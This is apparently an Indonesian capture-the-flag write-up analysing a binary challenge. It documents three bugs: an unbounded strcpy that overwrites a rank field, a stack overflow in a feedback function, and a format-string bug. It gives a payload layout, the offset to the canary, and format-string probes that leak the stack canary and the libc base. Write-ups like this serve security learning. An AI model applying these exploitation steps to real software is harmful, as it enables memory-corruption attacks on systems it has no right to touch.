# NFXCTF Convention — Analisis

[← Overview](10-nfxctf-convention.md) · [Index](index.md)

### 2.1 Layout data global

Dari symbol table dan instruksi `lea`:

```text
player   @ 0x4060
  +0x00  char name[64]
  +0x40  int  score
  +0x44  int  rank
  +0x48  char *quote
log_buf  @ 0x40c0
```

`register_user()` membaca maksimal 0x3f byte ke `player` dan memotong newline, aman.

### 2.2 Bug #1 — overflow nama menaikkan rank

`edit_name()` (offset `0x1458`):

```asm
1476: mov eax, DWORD PTR [rip+0x2c28]   # player+0x44 = rank
147c: cmp eax, 0x4
147f: jg  1492                          # hanya rank > 4 yang boleh edit
...
14ad: lea rax, [rbp-0x90]               # stack buffer 0x80
14b4: mov esi, 0x80
14bc: call fgets
14c1: lea rax, [rbp-0x90]
14cb: lea rax, [rip+0x2b8e]             # &player
14d5: call strcpy                       # <-- tanpa batas
```

`fgets` membatasi input 0x80 byte ke buffer stack, tetapi `strcpy` menyalinnya ke `player` yang hanya punya `name[64]` + `score` + `rank`. Dengan mini-game sekali, rank menjadi 5 sehingga pengecekan `rank > 4` lolos. Payload:

```text
64 byte 'A'  -> name
 4 byte 'B'  -> score
 1 byte 0x14 -> rank (byte pertama)
 newline '\n' dari fgets
 NUL terminator dari fgets
```

Hasil `strcpy` menulis `rank = 0x00000a14` = **2580**, jauh di atas 19.

### 2.3 Bug #2 — stack overflow di `leave_feedback()`

```asm
1776: leave_feedback:
177e: add rsp, 0xffffffffffffff80     # frame 0x80
178b: mov [rbp-0x8], canary
1791: mov eax, [player+0x44]          # rank
1797: cmp eax, 0x13
179a: jg  17b0                        # rank > 19
17c4: lea rax, [rbp-0x70]             # buffer 0x70
17c8: mov edx, 0x100
17d5: call read                       # <-- 0x100 byte ke buffer 0x70
```

Offset ke canary: `rbp - 0x70` → `rbp - 0x8` = **0x68 = 104 byte**. Setelah canary: saved RBP (8 byte), lalu saved RIP.

### 2.4 Bug #3 — format string di `view_profile()`

```asm
15c4: lea rax, [rip+0x2af5]   # log_buf
15d3: call printf              # printf(log_buf)
```

Feedback disimpan lebih dulu dengan `snprintf(log_buf, 0x100, "%s", buf)`, jadi isi feedback tidak diformat saat disimpan; tetapi saat `view_profile()` dipanggil, `log_buf` dipakai sebagai **format string**. Ini memberi arbitrary read dari stack.

Indeks yang diverifikasi dengan probe (lihat `assets/nfxctf-convention/03b-leak-probe.txt`):

```text
%7$p  = 0x970efad64c02bc00     # stack canary (low byte 00)
%17$p = 0x719bc3829d90         # return ke libc, offset 0x29d90
```

`%17$p - 0x29d90` menghasilkan base libc yang page-aligned (0x719bc3800000).
